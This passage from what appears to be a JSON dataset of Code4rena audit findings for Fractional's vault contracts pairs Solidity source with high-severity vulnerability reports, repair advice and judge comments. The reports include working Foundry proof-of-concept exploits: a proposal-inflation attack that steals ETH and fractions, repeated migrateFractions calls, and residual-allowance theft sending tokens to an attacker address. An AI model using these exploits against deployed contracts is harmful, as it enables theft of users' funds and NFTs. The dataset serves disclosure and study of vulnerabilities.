bob.migrationModule.join{value: 10 ether}(vault, 2, 24);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 101);\n\n\n        // Let's do some accounting...\n        (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);\n        (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);\n\n        // Alice proposal has 50 ETH.\n        assertEq(totalEth_AliceProposal, 50000000000000000000);\n\n        // Bob's proposal has 50 ETH.\n        assertEq(totalEth_BobProposal, 50000000000000000000);\n\n        // He only put 10 ETH, but it shows 50 ETH because\n        // we inflate it by exploiting the bug.\n\n        // We can keep inflating it indefinitely to get any ETH\n        // amount desired (up to the max ETH balance of the smart contract).\n\n        // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.\n\n        // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.\n\n        // STEP 6\n        // Bob calls commit to kickoff the buyout process\n        bool started = bob.migrationModule.commit(vault, 2);\n        assertTrue(started);\n\n        // Final accounting:\n        // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,\n        // exactly what is required to win a proposal)\n        assertEq(getFractionBalance(buyout), 5101);\n\n        // and 50 ETH from Alice's proposal\n        assertEq(getETHBalance(buyout), 50 ether);\n\n        // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether\n        assertEq(getETHBalance(bob.addr), 90 ether);\n\n        // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen\n        // from Alice's proposal\n        assertEq(getFractionBalance(bob.addr), 4899);\n\n        // Next steps are straight forward, you can get creative and do many things that would make the PoC\n        // unnecessarily long\n\n        // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE\n        // at the same time. Also, there's not enough ETH in the contract to commit his proposal,\n        // We are using all of his ETH in our own proposal.\n\n"
                ],
                "Type": " Steal NFTs from a Vault, and ETH + Fractional tokens from users.",
                "Description": "\nSteal NFTs from a Vault, and ETH + Fractional tokens from users.\n\n\nThe Migration.sol module expects users to join a proposal using the join function, and leave a proposal using the leave function, both functions update fraction and ether balances of the proposal *and* the caller.\n\nThe withdrawContribution function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.\n\nUnfortunately, the withdrawContribution function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables totalEth and totalFractions (as join and leave do), leading to an inflation of ETH and fractional tokens if the user calls join, withdrawContribution and join again.\n\nExploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:\n\n1Lack of funds (they were stolen).\n\n2Only 1 LIVE proposal can be running at the same time.\n\nA key element to take note is that only 1 proposal can be LIVE, but before a proposal goes LIVE, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.\n\n\nAn attacker will exploit the inflation bug as follows:\n\n1Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.\n\n2Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.\n\n3Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and start it.\n\nNow that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.\n\n*NOTE: In the REJECTION_PERIOD victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the depositAmount and msg.value (<https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker.*\n\n\nThe proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproducible PoC that illustrates the impact of the attack.\n\nEverything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.\n\nYou can read the PoC or include the function in test/Migration.t.sol and call forge test -vvv --match-test testProposalAttack to execute it.\n\n\n    function testProposalAttack() public {\n        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        address[] memory modules = new address[(1);\n        modules[0] = address(mockModule);\n\n        // STEP 0\n        // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made\n\n        // STEP 1\n        // Alice makes a legit proposal\n        alice.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY * 2,\n            1 ether\n        );\n\n        // STEP 3\n        // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000\n        alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);\n\n        // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,\n        // but to make this PoC easier to read, instead of creating several fake accounts,\n        // let's have just Alice join his own proposal with 50% of token supply.\n\n        // STEP 4\n        // Bob makes an evil proposal, with evil modules to steal the vault's NFTs\n        bob.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY,\n            1 ether\n        );\n\n        // STEP 5\n        // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal\n        // and total locked tokens (thanks to a bug in the withdrawContribution function)\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 24);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 101);\n\n\n        // Let's do some accounting...\n        (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);\n        (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);\n\n        // Alice proposal has 50 ETH.\n        assertEq(totalEth_AliceProposal, 50000000000000000000);\n\n        // Bob's proposal has 50 ETH.\n        assertEq(totalEth_BobProposal, 50000000000000000000);\n\n        // He only put 10 ETH, but it shows 50 ETH because\n        // we inflate it by exploiting the bug.\n\n        // We can keep inflating it indefinitely to get any ETH\n        // amount desired (up to the max ETH balance of the smart contract).\n\n        // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.\n\n        // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.\n\n        // STEP 6\n        // Bob calls commit to kickoff the buyout process\n        bool started = bob.migrationModule.commit(vault, 2);\n        assertTrue(started);\n\n        // Final accounting:\n        // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,\n        // exactly what is required to win a proposal)\n        assertEq(getFractionBalance(buyout), 5101);\n\n        // and 50 ETH from Alice's proposal\n        assertEq(getETHBalance(buyout), 50 ether);\n\n        // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether\n        assertEq(getETHBalance(bob.addr), 90 ether);\n\n        // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen\n        // from Alice's proposal\n        assertEq(getFractionBalance(bob.addr), 4899);\n\n        // Next steps are straight forward, you can get creative and do many things that would make the PoC\n        // unnecessarily long\n\n        // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE\n        // at the same time. Also, there's not enough ETH in the contract to commit his proposal,\n        // We are using all of his ETH in our own proposal.\n\n\n\n\nRun forge test -vvv --match-test testProposalAttack after preparing the testing environment as explained here(https://github.com/code-423n4/2022-07-fractional#prepare-environment).\n\n",
                "Repair": "\nUpdate the proposal.totalEth and proposal.totalFractions in the withdrawContribution function.\n\nFerret-san (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/27) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/27#issuecomment-1204498026):\n  This is a very detailed report! Agree this is a High risk finding.\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n",
        "CodeNames": [
            "IMigration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-11",
                "Location": [
                    "migrateFractions"
                ],
                "Type": " Users can lose fractions to precision loss during migraction if _newFractionSupply is set very low",
                "Description": "\nPrecision loss causing loss of user value and potentially cause complete loss to vault.\n\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472\n\nIf the supply of the fraction is set to say 10 then any user that uses migrateFractions with less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.\n\n",
                "Repair": "\nWhen calling propose require that _newFractionSupply is greater than some value (i.e. 1E18).\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/137) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/137#issuecomment-1208614341):\n  Rounding can lead to loss of assets. Agree with severity.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-16",
                "Location": [
                    "//solidity\n\tfunction testMigrateFractionsAgain() public {\n        // Setup\n        testSettle();\n        (, , , , address newVault, , , , ) = migrationModule.migrationInfo(\n            vault,\n            1\n        );\n        (address newToken, uint256 id) = registry.vaultToToken(newVault);\n\n        // First user migrates fractions twice\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2);            // Confirm Migration has all new tokens\n\n        assertEq(getFractionBalance(alice.addr), 4000);                         // Alice joined with 1 ether and 1000 fractions\n        alice.migrationModule.migrateFractions(vault, 1);\n        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 6000);           // Alice's shares == 6000\n\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2 6000);            // Confirm Migration loses new tokens\n\n        alice.migrationModule.migrateFractions(vault, 1);\n        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 12000);          // Confirm Alice gains 6000 new tokens again\n\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), 8000);            // Confirm Migration loses new tokens\n\n        // Second user attempts to migrate fractions\n        assertEq(getFractionBalance(bob.addr), 0);                              // Bob joined with 1 ether and 5000 fractions (all of his fractions)\n        vm.expectRevert(stdError.arithmeticError);\n        bob.migrationModule.migrateFractions(vault, 1);                         // Bob is unable to call migrateFractions and gain new tokens because the migration module does not contain enough tokens\n        assertEq(IERC1155(newToken).balanceOf(bob.addr, id), 0);                // Confirm Bob does not gain any new tokens (supposed to gain 14,000 tokens)\n    }\n"
                ],
                "Type": "    migrateFractions    may be called more than once by the same user which may lead to loss of tokens for other users",
                "Description": "\nThe migrateFractions function in the Migration.sol contract is used to send new vault tokens to the user calculated based on the amount of ETH and fractions the user contributed to the migration proposal. After it is called once the user should have all the new vault tokens owed to them.\n\nSince the function does not check if the user had already called it, a user may call it more than once, allowing them to gain more new vault tokens than they are owed. If a user repeatedly uses this function to gain new tokens then other users may not be able to get their new tokens.\n\n\nTest code added to Migrations.t.sol:\n\nThe test code below shows the first user (Alice) migrating their tokens to the new vault twice before the second user (Bob) calls migrateFractions which then fails.\n\nsolidity\n\tfunction testMigrateFractionsAgain() public {\n        // Setup\n        testSettle();\n        (, , , , address newVault, , , , ) = migrationModule.migrationInfo(\n            vault,\n            1\n        );\n        (address newToken, uint256 id) = registry.vaultToToken(newVault);\n\n        // First user migrates fractions twice\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2);            // Confirm Migration has all new tokens\n\n        assertEq(getFractionBalance(alice.addr), 4000);                         // Alice joined with 1 ether and 1000 fractions\n        alice.migrationModule.migrateFractions(vault, 1);\n        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 6000);           // Alice's shares == 6000\n\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), TOTAL_SUPPLY * 2 6000);            // Confirm Migration loses new tokens\n\n        alice.migrationModule.migrateFractions(vault, 1);\n        assertEq(IERC1155(newToken).balanceOf(alice.addr, id), 12000);          // Confirm Alice gains 6000 new tokens again\n\n        assertEq(IERC1155(newToken).balanceOf(address(migrationModule), id), 8000);            // Confirm Migration loses new tokens\n\n        // Second user attempts to migrate fractions\n        assertEq(getFractionBalance(bob.addr), 0);                              // Bob joined with 1 ether and 5000 fractions (all of his fractions)\n        vm.expectRevert(stdError.arithmeticError);\n        bob.migrationModule.migrateFractions(vault, 1);                         // Bob is unable to call migrateFractions and gain new tokens because the migration module does not contain enough tokens\n        assertEq(IERC1155(newToken).balanceOf(bob.addr, id), 0);                // Confirm Bob does not gain any new tokens (supposed to gain 14,000 tokens)\n    }\n\n\n",
                "Repair": "\nA possible fix might be to set the userProposalEth and userProposalFractions to 0 after the user's tokens have been migrated.\n\nmehtaculous (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/460)\n\nHardlyDifficult (judge) increased severity to High and commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/467#issuecomment-1212267561):\n migrateFractions can be called multiple times, stealing funds from other users. This is a High risk issue.\n \n Selecting this submission as the primary for including a clear POC.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-20",
                "Location": [
                    "withdrawContribution",
                    "leave"
                ],
                "Type": " Migration's  leave  function allows leaving a committed proposal",
                "Description": "\nThe leave function allows to leave a proposal even if the proposal has been committed and failed.\nThis makes it a (probably unintended) duplicate functionality of withdrawContributions, which is the function that should be used to withdraw failed contributions.\n\n\nUser assets might be lost:\nWhen withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue \"Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back\").\nBut when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed.\nTherefore, if leave does not check if the proposal has been committed, users could call leave instead of withdrawContribution and get back a different amounts of assets than they deserve, on the expense of other users.\n\n\nThe leave function does not check(https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141) anywhere whether proposal.isCommited == true.\n\nTherefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.\n\n",
                "Repair": "\nRevert in leave if proposal.isCommited == true.\nYou might be also able to merge the functionality of leave and withdrawContribution, but that depends on how you will implement the fix for withdrawContribution.\n\nFerret-san (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/379) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/379#issuecomment-1214481867):\n  Users can withdraw more than expected after a failed proposal, which leads to a deficit and loss of assets for others. Agree with High risk.\n\n\n\n*\n\n \n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport \"./TestUtil.sol\";\n\ncontract BaseVaultTest is TestUtil {\n    /// =================\n    /// ===== SETUP =====\n    /// =================\n    function setUp() public {\n        setUpContract();\n        alice = setUpUser(111, 1);\n        setUpCreateFor(alice);\n        setUpMulticall(alice);\n\n        vm.label(address(this), \"BaseVaultTest\");\n        vm.label(alice.addr, \"Alice\");\n    }\n\n    /// ========================\n    /// ===== DEPLOY VAULT =====\n    /// ========================\n    function testDeploy() public {\n        vault = alice.baseVault.deployVault(\n            TOTAL_SUPPLY,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            mintProof\n        );\n        (token, tokenId) = registry.vaultToToken(vault);\n\n        assertEq(getFractionBalance(alice.addr), TOTAL_SUPPLY);\n    }\n\n    /// =====================\n    /// ===== MULTICALL =====\n    /// =====================\n    function xtestMulticallDeploy() public {\n        factory = registry.factory();\n        vault = IVaultFactory(factory).getNextAddress(alice.addr);\n        alice.erc721.safeTransferFrom(alice.addr, vault, 1);\n        bytes memory deployVault = initializeDeploy();\n        bytes memory depositERC721 = initializeDepositERC721(2);\n        bytes[] memory data = new bytes[](2);\n        data[0] = deployVault;\n        data[1] = depositERC721;\n\n        assertEq(IERC721(erc721).balanceOf(alice.addr), 3);\n        assertEq(IERC721(erc721).balanceOf(vault), 0);\n\n        alice.baseVault.multicall(data);\n\n        assertEq(IERC721(erc721).balanceOf(alice.addr), 0);\n        assertEq(IERC721(erc721).balanceOf(vault), 3);\n    }\n\n    function testMulticallDeposit() public {\n        deployBaseVault(alice, TOTAL_SUPPLY);\n        bytes memory depositERC721 = initializeDepositERC721(2);\n        bytes memory depositERC1155 = initializeDepositERC1155(2);\n        bytes memory depositERC20 = initializeDepositERC20(10);\n        bytes[] memory data = new bytes[](3);\n        data[0] = depositERC721;\n        data[1] = depositERC1155;\n        data[2] = depositERC20;\n\n        assertEq(IERC721(erc721).balanceOf(alice.addr), 2);\n        assertEq(IERC1155(erc1155).balanceOf(alice.addr, 1), 10);\n        assertEq(IERC1155(erc1155).balanceOf(alice.addr, 2), 10);\n        assertEq(IERC20(erc20).balanceOf(alice.addr), 10);\n\n        alice.baseVault.multicall(data);\n\n        assertEq(IERC721(erc721).balanceOf(vault), 3);\n        assertEq(IERC1155(erc1155).balanceOf(vault, 1), 10);\n        assertEq(IERC1155(erc1155).balanceOf(vault, 2), 10);\n        assertEq(IERC20(erc20).balanceOf(vault), 10);\n    }\n\n    function xtestMulticallDeployDeposits() public {\n        factory = registry.factory();\n        vault = IVaultFactory(factory).getNextAddress(alice.addr);\n        alice.erc721.safeTransferFrom(alice.addr, vault, 1);\n        bytes memory deployVault = initializeDeploy();\n        bytes memory depositERC721 = initializeDepositERC721(2);\n        bytes memory depositERC1155 = initializeDepositERC1155(2);\n        bytes memory depositERC20 = initializeDepositERC20(10);\n        bytes[] memory data = new bytes[](4);\n        data[0] = deployVault;\n        data[1] = depositERC721;\n        data[2] = depositERC1155;\n        data[3] = depositERC20;\n\n        assertEq(IERC721(erc721).balanceOf(alice.addr), 3);\n        assertEq(IERC1155(erc1155).balanceOf(alice.addr, 1), 10);\n        assertEq(IERC1155(erc1155).balanceOf(alice.addr, 2), 10);\n        assertEq(IERC20(erc20).balanceOf(alice.addr), 10);\n\n        alice.baseVault.multicall(data);\n\n        assertEq(IERC721(erc721).balanceOf(vault), 3);\n        assertEq(IERC1155(erc1155).balanceOf(vault, 1), 10);\n        assertEq(IERC1155(erc1155).balanceOf(vault, 2), 10);\n        assertEq(IERC20(erc20).balanceOf(vault), 10);\n    }\n}\n\n\n",
        "CodeNames": [
            "BaseVault.t.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-12",
                "Location": [
                    "//solidity\nerc20.approve(address(baseVault), type(uint256).max);\nerc721.setApprovalForAll(address(baseVault), true);\nerc1155.setApprovalForAll(address(baseVault), true);\n",
                    "//solidity\nbaseVault.batchDepositERC20(alice.addr, vault, XYZ.addr], 50])\nbaseVault.batchDepositERC721(alice.addr, vault, APE.addr], #1])\nbaseVault.batchDepositERC1155(alice.addr, vault, ABC.addr], #1], 50], \"\")\n",
                    "//solidity\nbaseVault.batchDepositERC20(alice.addr, attacker.addr, XYZ.addr], 950])\nbaseVault.batchDepositERC721(alice.addr, attacker.addr, APE.addr, APE.addr], #2, #3])\nbaseVault.batchDepositERC1155(alice.addr, attacker.addr, ABC.addr], #1], 950], \"\")\n",
                    "//solidity\nfunction batchDepositERC20(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _amounts\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n        IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n",
                    "//solidity\nfunction batchDepositERC721(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n        IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n",
                    "//solidity\nfunction batchDepositERC1155(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids,\n    uint256[] calldata _amounts,\n    bytes[] calldata _datas\n) external {\n    unchecked {\n        for (uint256 i = 0; i < _tokens.length; ++i) {\n            IERC1155(_tokens[i]).safeTransferFrom(\n                _from,\n                _to,\n                _ids[i],\n                _amounts[i],\n                _datas[i]\n            );\n        }\n    }\n}\n"
                ],
                "Type": " Malicious Users Can Exploit Residual Allowance To Steal Assets",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91\n\n\nA depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.\n\n\nAssume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet\n\n*   1000 XYZ ERC20 tokens\n*   APE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,\n*   1000 ABC ERC1155 tokens\n\nThus, she sets up the necessary approval to grant baseVault(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L17) contract the permission to transfer her tokens to the vault.\n\nsolidity\nerc20.approve(address(baseVault), type(uint256).max);\nerc721.setApprovalForAll(address(baseVault), true);\nerc1155.setApprovalForAll(address(baseVault), true);\n\n\nAlice decided to deposit 50 XYZ ERC20 tokens, APE #1 ERC721 NFT, and 50 ABC tokens to the vault by calling baseVault.batchDepositERC20, baseVault.batchDepositERC721, and baseVault.batchDepositERC1155 as shown below:\n\nsolidity\nbaseVault.batchDepositERC20(alice.addr, vault, XYZ.addr], 50])\nbaseVault.batchDepositERC721(alice.addr, vault, APE.addr], #1])\nbaseVault.batchDepositERC1155(alice.addr, vault, ABC.addr], #1], 50], \"\")\n\n\nAn attacker notices that there is residual allowance left on the baseVault, thus the attacker executes the following transactions to steal Alice's assets and send them to the attacker's wallet address.\n\nsolidity\nbaseVault.batchDepositERC20(alice.addr, attacker.addr, XYZ.addr], 950])\nbaseVault.batchDepositERC721(alice.addr, attacker.addr, APE.addr, APE.addr], #2, #3])\nbaseVault.batchDepositERC1155(alice.addr, attacker.addr, ABC.addr], #1], 950], \"\")\n\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58\n\nsolidity\nfunction batchDepositERC20(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _amounts\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n        IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77\n\nsolidity\nfunction batchDepositERC721(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids\n) external {\n    for (uint256 i = 0; i < _tokens.length; ) {\n        IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);\n        unchecked {\n            ++i;\n        }\n    }\n}\n\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91\n\nsolidity\nfunction batchDepositERC1155(\n    address _from,\n    address _to,\n    address[] calldata _tokens,\n    uint256[] calldata _ids,\n    uint256[] calldata _amounts,\n    bytes[] calldata _datas\n) external {\n    unchecked {\n        for (uint256 i = 0; i < _tokens.length; ++i) {\n            IERC1155(_tokens[i]).safeTransferFrom(\n                _from,\n                _to,\n                _ids[i],\n                _amounts[i],\n                _datas[i]\n            );\n        }\n    }\n}\n\n\n\nLoss of assets for users as a malicious user could utilise the baseVault contract to exploit the user's residual allowance to steal their assets.\n\n",
